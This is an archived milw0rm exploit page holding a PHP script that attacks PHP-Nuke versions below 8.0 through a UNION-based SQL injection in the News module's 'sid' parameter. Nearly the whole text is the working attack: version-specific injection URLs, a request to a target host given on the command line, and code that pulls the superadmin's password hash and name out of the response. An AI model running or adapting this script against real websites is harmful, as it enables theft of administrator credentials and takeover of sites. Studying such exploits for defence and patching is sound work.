<html><head><title>PHP-Nuke < 8.0 (sid) Remote SQL Injection Exploit</title></head><pre>&lt;?php
error_reporting (E_ERROR);
ini_set(&quot;max_execution_time&quot;,0);

echo '
+=========================================+
| RST/GHC unpublished PHP Nuke exploit &lt;8 |
+=========================================+
&lt;+&gt; version &lt;8.0
&lt;+&gt; Tested on 7.9 &amp; 6.0
';

if ($argc &lt; 2){
print &quot;Usage: &quot; . $argv[0] . &quot; &lt;host&gt; &lt;version&gt; [table prefix]\n&quot;;
print &quot;ex.: &quot; . $argv[0] . &quot; phpnuke.org 7\n&quot;;
credits();
exit;
}


/* few definitions */
if (empty($argv[3])){ $prefix = 'nuke';} #define tables prefix
else {$prefix = $argv[3];}

switch ($argv[2]){
case &quot;6&quot;:
$query =&quot;modules.php?name=News&amp;file=article&amp;sid=99999999+UNION+SELECT+null%20as%20catid,pwd%20as%20aid,null%20as%20time,pwd%20as%20title,null%20as%20hometext,aid%20as%20bodytext,null%20as%20topic,null%20as%20informant,null%20as%20notes,null%20as%20acomm,%20null%20as%20haspoll,null%20as%20pollID,null%20as%20score,null%20as%20ratings%20FROM%20%60&quot;.$prefix.&quot;_authors%60%20WHERE%20%60radminsuper%60%20='1'&quot;;
$version = 6;
break;
default:
$query =&quot;modules.php?name=News&amp;file=article&amp;sid=99999999'+UNION+SELECT+null%20as%20catid,pwd%20as%20aid,null%20as%20time,pwd%20as%20title,null%20as%20hometext,aid%20as%20bodytext,null%20as%20topic,null%20as%20informant,null%20as%20notes,null%20as%20acomm,%20null%20as%20haspoll,null%20as%20pollID,null%20as%20score,null%20as%20ratings%20FROM%20%60&quot;.$prefix.&quot;_authors%60%20WHERE%20%60radminsuper%60%20='1&quot;;
$version = 7;
break;
}

$host = 'http://' . $argv[1] . '/'; # argv[1] - host
$http = $host . $query;
echo
'[+] host: '.$host . '
[+] nuke version: '.$version.'
';
#DEBUG
//print $http . &quot;\n&quot;;

$result = file_get_contents($http);

preg_match(&quot;/([a-f0-9]{32})/&quot;, $result, $matches);
if ($matches[0]) {print &quot;Admin's Hash: &quot;.$matches[0];
if (preg_match(&quot;/(?&lt;=\&lt;br\&gt;\&lt;br\&gt;)(.*)(?=\&quot;\&lt;\/i\&gt;)/&quot;, $result, $match)) print &quot;\nAdmin's name: &quot; .$match[0];}
else {echo &quot;Exploit failed...&quot;;}

credits();


function credits(){
print &quot;\n\n+========================================+\n\r Coded by Foster \n\r Copyright (c) RST/GHC&quot;;
print &quot;\n\r+========================================+\n&quot;;
exit;
}

?&gt;

# milw0rm.com [2008-01-22]</pre></html>